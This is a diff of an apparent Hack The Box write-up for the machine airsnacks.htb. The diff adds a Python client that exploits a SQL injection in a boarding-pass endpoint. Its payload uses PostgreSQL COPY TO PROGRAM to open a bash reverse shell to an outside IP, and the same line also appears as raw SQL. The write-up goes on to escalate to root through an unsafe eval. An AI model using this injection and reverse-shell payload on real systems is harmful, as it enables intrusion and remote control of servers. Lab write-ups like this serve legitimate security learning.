@@ -3,20 +3,43 @@
 ## Recon
 - Target: `airsnacks.htb` / `10.129.231.23`
 - External scan: Ports `22`, `80`, `443` open
-- Port `8000` only reachable on localhost - served via nginx to the web ports
+- Port `8000` only reachable from `localhost` - sitting behind `nginx` reverse-proxy, served on `80` and `443`
 
 ## Foothold - SQL Injection in Boarding Pass Scanner
 - Found a SQL injection in the checkout endpoint: `POST https://airsnacks.htb/checkout/boarding-pass/verify`
 - The endpoint parses a fixed-format boarding pass string (`raw` field) and inserts one of its fields into a query unsanitized; closing the field and appending `||<subquery>||` into the trailing item let arbitrary SQL ride along
 - Backend identified as PostgreSQL `18.6`
-- Automated the injection with a Python client (`step1/db-request.py`) that builds the fixed-width `raw` field, computes its length in hex, and POSTs it with the session cookie
+- Automated the injection with a Python client (`db-request.py`) that builds the fixed-width `raw` field, computes its length in hex, and POSTs it with the session cookie
+```python
 
+import requests, json, urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+URL = "https://airsnacks.htb/checkout/boarding-pass/verify"
+SESSION_COOKIE = "eyJjYXJ0Ijp7IkJFUi1TQlctNiI6MX0sImNhcnRfaWQiOiJjXzMwZmVmY2VhOGYifQ.avAjsg.xQ_tHTW2oJ2JXOR2ViiTxpc_Op4"
+
+PREFIX = "M1TEST/USER           EABC123 YULFRAAC 0834 312F001A0025 1"
+SUFFIX = ">80B0WW6312BAC 03ABC"
+HEADERS = {"Content-Type": "application/json", "Cookie": f"session={SESSION_COOKIE}"}
+
+QUERY = '1);COPY (SELECT 1) TO PROGRAM $$bash -c "bash -i >& /dev/tcp/10.10.15.223/7777 0>&1"$$;--'
+
+def build_raw(query):
+    tail = SUFFIX + f"'||{query}||'"
+    length = len(tail.encode("ascii"))
+    return PREFIX + f"{length:02X}" + tail
+
+raw = build_raw(QUERY)
+resp = requests.post(URL, headers=HEADERS, data=json.dumps({"raw": raw}), verify=False)
+print(resp.text)
+
+```
 ### Database user and role enumeration
 - Current database user: `airsnacks_app`
 - Found membership in role `pg_execute_server_program`
 - Confirmed `MEMBER`, `USAGE` and `SET` = `true` on that role
 
-### RCE via `COPY ... TO PROGRAM`
+### Database RCE
 - `pg_execute_server_program` membership allows `COPY` to pipe query output through an arbitrary shell command
 ```sql
 1);COPY (SELECT 1) TO PROGRAM $$bash -c "bash -i >& /dev/tcp/10.10.15.223/7777 0>&1"$$;--
@@ -30,7 +53,7 @@
 - `htbairways` is owned by the PostgreSQL user `postgres`
 - Database content irrelevant to the rest of the chain
 
-## Pivot `postgres` -> `dutyfree-kiosk`
+## Horizontal Movement
 - Checked system-level permissions of `postgres`: member of group `ssl-cert`, confirmed read access to `ssl-cert-snakeoil.key`
 - Checked SUID/SGID binaries and Linux capabilities - nothing directly usable
 - Found Snap and LXD present but did not use them for escalation
@@ -72,7 +95,7 @@ def tap_char(ch):
   - the `.service` unit has no `User=` directive, so it runs as `root` by default
   - the script parses the CSV and uses an unsafe `eval` on one of its fields
 
-## Root - Confirmed Command Execution via `eval`
+## Unsanitized `eval` command execution
 - Vulnerable line in `apply-duty-rates.sh`:
 ```bash
 eval "${tax_class}=${duty_pct}"
